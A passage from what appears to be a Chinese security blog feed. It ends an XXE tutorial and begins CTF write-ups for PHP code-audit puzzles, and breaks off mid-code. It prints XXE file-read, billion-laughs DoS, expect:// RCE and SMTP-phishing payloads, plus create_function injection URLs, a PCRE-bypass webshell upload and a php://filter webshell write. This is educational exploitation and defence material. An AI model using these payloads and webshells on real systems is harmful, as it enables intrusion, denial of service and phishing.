src="https://i.loli.net/2019/02/17/5c695e0ec66f7.png"></p><p><img src="https://i.loli.net/2019/02/17/5c695ecb3514c.png"></p><p><em>笔者测试发现不同的环境，结果可能会不一样，因此可能需要不同的payload进行端口扫描，这个需要具体结合代码和测试结果来敲定一个有效的payload。</em></p><h2 id="5-XInclude"><a href="#5-XInclude" class="headerlink" title="5. XInclude"></a>5. XInclude</h2><p>这个和<code>SchemaEntity</code>有关，可以看成是XML的扩展和继承，想了解更多可能要参考这个： <a href="http://www.w3school.com.cn/schema/schema_intro.asp">http://www.w3school.com.cn/schema/schema_intro.asp</a></p><p><strong>XML Schema：</strong>称为可扩展标记语言架构，用来定义 XML 文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情 。</p><p>include的href属性中可以进行文件读取，也可以使用协议进行SSRF。不过Xinclude需要手动开启，测试发现所有xml parser都默认关闭这一特性。</p><p><strong>示例代码</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///home/rq/f123333333ag&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-其他攻击"><a href="#6-其他攻击" class="headerlink" title="6. 其他攻击"></a>6. 其他攻击</h2><h3 id="6-1-DDoS"><a href="#6-1-DDoS" class="headerlink" title="6.1 DDoS"></a>6.1 DDoS</h3><p><strong>示例代码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;dev&#x2F;random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h3 id="6-2-php-except模块下RCE"><a href="#6-2-php-except模块下RCE" class="headerlink" title="6.2 php except模块下RCE"></a>6.2 php except模块下RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE。</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;&#x2F;dir&gt;</span><br></pre></td></tr></table></figure><h3 id="6-3-钓鱼"><a href="#6-3-钓鱼" class="headerlink" title="6.3 钓鱼"></a>6.3 钓鱼</h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼。以下内容摘自<a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><p>我们使用Java的XML解析器找到了一个易受攻击的端点。扫描内部端口后，我们发现了一个侦听在25端口的SMTP服务，Java支持在<code>sun.net.ftp.impl.FtpClient</code>中的ftp URI。因此，我们可以指定用户名和密码，例如<code>ftp://user:password@host:port/test.txt</code>，FTP客户端将在连接中发送相应的USER命令。</p><p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a%0D%0A</span></span><br><span class="line">EHLO%<span class="number">20</span>a%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">MAIL%<span class="number">20</span>FROM%<span class="number">3</span>A%<span class="number">3</span>Csupport%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">RCPT%<span class="number">20</span>TO%<span class="number">3</span>A%<span class="number">3</span>Cvictim%<span class="number">40</span>gmail.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">DATA%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">From%<span class="number">3</span>A%<span class="number">20</span>support%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">0</span>A</span><br><span class="line">To%<span class="number">3</span>A%<span class="number">20</span>victim%<span class="number">40</span>gmail.com%<span class="number">0</span>A</span><br><span class="line">Subject%<span class="number">3</span>A%<span class="number">20</span>test%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>A</span><br><span class="line">test!%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">.%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">QUIT%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">:a@VULNERABLESYSTEM.com:<span class="number">25</span></span><br></pre></td></tr></table></figure><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a</span></span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: <span class="xml"><span class="tag">&lt;<span class="name">support@VULNERABLESYSTEM.com</span>&gt;</span></span></span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p><h1 id="XXE的防护"><a href="#XXE的防护" class="headerlink" title="XXE的防护"></a>XXE的防护</h1><p>在介绍成因的时候说过，<strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，所以防护方法就是<strong>使用语言中推荐的禁用外部实体的方法</strong>。</p><p><strong>PHP：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p><strong>Java:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure><p><strong>Python：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XXE作为2017最新发布的<code>OWASP TOP10</code>的漏洞，其广泛性和危害性不言而喻。其攻击手段也是多种多样，在和其他漏洞结合之后，可以产生惊人的效果。笔者对XXE做了很多的复现和研究，得到的一些感悟和收获。之后可能还会对扩展性的xml_Schema以及与其他漏洞的结合做进一步的深入学习研究。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/3357">K0rz3n——一篇文章带你深入理解漏洞之 XXE 漏洞</a></li><li><a href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></li><li><a href="https://www.cnblogs.com/likwo/archive/2011/08/24/2151793.html">XML文档解析的几种方式</a></li><li><a href="https://www.freebuf.com/column/156863.html">freebuf——XXE学习之路-STEP BY STEP</a></li><li><a href="https://www.freebuf.com/articles/web/177979.htm">freebuf——XXE漏洞利用技巧：从XML到远程代码执行</a></li><li>[DTD/XXE 攻击笔记分享](DTD/XXE 攻击笔记分享)</li><li><a href="https://wooyun.js.org/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html">你所不知道的XML安全</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE是什么&quot;&gt;&lt;a href=&quot;#XXE是什么&quot; class=&quot;headerlink&quot; title=&quot;XXE是什么&quot;&gt;&lt;/a&gt;XXE是什么&lt;/h1&gt;&lt;p&gt;XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个</summary>
      
    
    
    
    <category term="Web安全" scheme="v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XXE" scheme="v0w.top/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>知识星球-代码审计Codebreak部分WP</title>
    <link href="v0w.top/2019/01/16/CodeBreak/"/>
    <id>v0w.top/2019/01/16/CodeBreak/</id>
    <published>2019-01-15T16:00:00.000Z</published>
    <updated>2020-07-18T10:38:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近既忙又懒，终于放了寒假，想起来看看p牛的<a href="https://code-breaking.com/">CodeBreaking-Puzzles</a>，学习一波。这里给P总的<strong>代码审计知识星球 小密圈</strong>打个广告，满满干货，个个都是人才，我超喜欢里面的。另外，很感谢网上现有的一些WP，帮助我这个菜鸡理解漏洞和学习。</p><h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$arg = $_GET[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">&#x27;&#x27;</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一题，就把我难住了，感叹一下自己有多菜。。。</p><p>其实代码逻辑很简单：</p><ol><li><p>这里<code>??</code>是php7+的用法，<code>$_GET[‘action’]非空则 $action = $_GET[‘action’]</code></p></li><li><p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p></li></ol><p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”\”。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。</p><p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442">http://blog.51cto.com/lovexm/1743442</a></p><p>禁用了<code>system()</code>函数，<code>exec()函数</code>、<code>passthru()函数</code>、<code>shell_exec()函数</code>,<code> popen()</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;51.158.75.42:8087&#x2F;?action&#x3D;\create_function&amp;arg&#x3D;;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">Warning: system() has been disabled for security reasons in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(8) : runtime-created function on line 1</span><br></pre></td></tr></table></figure><p><code>file_put_contents</code>也没有写权限。只剩下<code>file_get_contens</code>和<code>print_r</code>可用。</p><p>参考王一航表哥的博客，<a href="https://www.jianshu.com/p/33bc37ef72cc">花式列目录，花式读文件</a></p><h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;51.158.75.42:8087&#x2F;?action&#x3D;\create_function&amp;arg&#x3D;;&#125;print_r(glob(%22..&#x2F;*%22));&#x2F;&#x2F;</span><br><span class="line">Array ( [0] &#x3D;&gt; ..&#x2F;flag_h0w2execute_arb1trary_c0de [1] &#x3D;&gt; ..&#x2F;html )</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;51.158.75.42:8087&#x2F;?action&#x3D;\create_function&amp;arg&#x3D;;&#125;print_r(file_get_contents(%27..&#x2F;flag_h0w2execute_arb1trary_c0de%27));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">&#x27;data/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bad request&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">&#x27;/&#x27;</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&quot;Location: $path&quot;</span>, <span class="literal">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码逻辑很简单，对上传的文件内容做正则检测，不符合正则形式，就进行跳转执行。</p><p>问题就落在了，如何绕过这个正则检测<code>preg_match</code>函数。</p><h3 id="PRCE＆分析"><a href="#PRCE＆分析" class="headerlink" title="PRCE＆分析"></a>PRCE＆分析</h3><p>谷歌<strong>PCRE特性</strong>，得到一篇解释的比较不错的文章——<a href="http://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯/递归限制</a></p><p>PRCE使用NFA正则引擎。</p><blockquote><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态。</p><p>这是一种费贪婪匹配，非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下（如 .* ）, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再回溯, 进行匹配.</p></blockquote><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line"></span><br><span class="line">1. 源字符串: aaab</span><br><span class="line">2. 正则:     .*?b</span><br><span class="line"></span><br><span class="line">匹配过程开始的时候, “.*?”首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给”.*?”, 这个时候, “.*?”匹配一个字符”a”, 并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯</span><br></pre></td></tr></table></figure><p>知道了这个，于是看这个题：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_match(&#39;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&#39;, $data)</span><br></pre></td></tr></table></figure><p>如果我们输入<code>&lt;?php print;abcd</code></p><p>正则的匹配控制权会先转移给  **[(<code>;?&gt;].** 于是先把</code>&lt;?php print;abcd<code>当做备选，然后发现d匹配不上这段正则，于是回溯到</code>&lt;?php print;abc<code>，发现c也匹配不到，回溯到b，...,最终回溯到</code>;`结束。</p><p>但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制。该回溯限制，可以查看，5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/ldl<span class="comment"># php -a</span></span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line">string(7) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = fopen(<span class="string">&quot;poc.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$msg = <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>.str_repeat(<span class="string">&quot;v&quot;</span>,<span class="number">1000000</span>);</span><br><span class="line">fwrite($f,$msg);</span><br><span class="line">fclose($f);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190116175800.png"></p><p>这里我傻了一下，没有先看<code>phpinfo</code>的禁用函数，使劲用<code>system（）</code>,怎么都没回显，害得我还以为是我上传出了问题。发现禁用了一些危险函数：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190116175948.png"></p><p>换一些payload，可以读目录和文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;print_r(scandir(&#39;..&#x2F;..&#x2F;..&#x2F;&#39;));</span><br><span class="line">cmd&#x3D;readfile(&#39;..&#x2F;..&#x2F;..&#x2F;flag_php7_2_1s_c0rrect&#39;);</span><br></pre></td></tr></table></figure><h1 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h1><p>功能上很明显直接用一个dig 命令查看一个可控的域名，记录到可控的日志中。</p><p><img src="http://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117200350.png"></p><p>关键代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;read-source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DATA_DIR&#x27;</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/data/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;domain&#x27;</span>]) ? $_POST[<span class="string">&#x27;domain&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;log&#x27;</span>]) ? $_POST[<span class="string">&#x27;log&#x27;</span>] : date(<span class="string">&#x27;-Y-m-d&#x27;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(<span class="string">&quot;dig -t A -q %s&quot;</span>, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[<span class="string">&#x27;SERVER_NAME&#x27;</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line"><span class="keyword">endif</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们能控制文件名和文件内容，但是文件内容被<code>htmlspecialchars</code>函数过滤了一次，尖括号没了，所以想直接写一个webshell是不可能的。</p><h3 id="php-filter-amp-file-put-contents"><a href="#php-filter-amp-file-put-contents" class="headerlink" title="php://filter&amp;file_put_contents"></a>php://filter&amp;file_put_contents</h3><p>这里涉及到一个php黑魔法，<code>php://filter</code>，<strong>只要是传filename的地方，基本都可以传协议流</strong>。</p><p>以前见到的情况和套路都是<code>include()、file_get_contents()</code>的参数可控，我们用<code>php://filter/read</code>配合<code>base64-encode</code>可以把文件编码成base64后输出。没想到<code>file_put_contents</code>文件名可控时也有magic</p><p>当我们可控的文件名<code>$filename</code>传入参数<code>php://filter/write=convert.base64-encode/resource=shell.php</code>，<code>$data</code>传入<code>djB3IHRlc3Q=</code>时，<code>file_put_contents($file,$text)</code>执行的内容如下：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117204908.png"></p><h3 id="几个trick"><a href="#几个trick" class="headerlink" title="几个trick"></a>几个trick</h3><p>那么思路也就很清晰了，我们可以通过这个方法向服务器写shell，但是还存在几个问题：</p><ol><li><p>后缀名过滤真的很严格</p></li><li><p><code>$log_name</code>之前会加上<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，似乎是不完全可控文件名</p></li></ol><p>第一、如何绕过文件检测，这里用到一个trick：<a href="http://wonderkun.cc/index.html/?p=626">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a>还有<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a></p><p>可以使用<code>/.</code>或者<code>\x0a</code>绕过。</p><p>第二、查看手册，发现我们可以通过修改<code>HTTP headers</code>中的``Host<code>的值从而控制</code>$_SERVER[‘SERVER_NAME’]`。那么文件名我们也完全可控了。</p><blockquote><p>Note:         在 Apache 2 里，必须设置 UseCanonicalName = On         和 ServerName。        否则该值会由客户端提供，就有可能被伪造。        上下文有安全性要求的环境里，不应该依赖此值。 </p></blockquote><p>第三、base64在解码时，如果参数中有非法字符（不在上面64个字符内的），就会跳过。(至少在php中是这样的)还有一点需要注意base64中的<code>=</code>只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有<code>=</code>。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&quot;&lt;?php @eval($_REQUEST[&#x27;123&#x27;]);?&gt;&quot;</span>)</span><br><span class="line"><span class="string">&#x27;PD9waHAgQGV2YWwoJF9SRVFVRVNUWycxMjMnXSk7Pz4=&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117231923.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117232304.png"></p><h1 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目现在看，好像很简单。code参数传入一个执行的函数，与前面<code>；</code>匹配的话，就执行。</p><p>关键是一个<code>?R</code>的用法，不太明白也是参考这篇<a href="https://blog.csdn.net/technofiend/article/details/49906755">理解正则表达式中的(?R)递归</a>才有所发现：</p><blockquote><p>?R 表示正则递归匹配，</p></blockquote><p>在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $func1 = <span class="string">&quot;a(b(c()));&quot;</span>;</span><br><span class="line">  $func2 = <span class="string">&quot;a((b());&quot;</span>;</span><br><span class="line">  $func3 = <span class="string">&quot;a(b(c(parmer)));&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">print</span> preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $func1);</span><br><span class="line">  <span 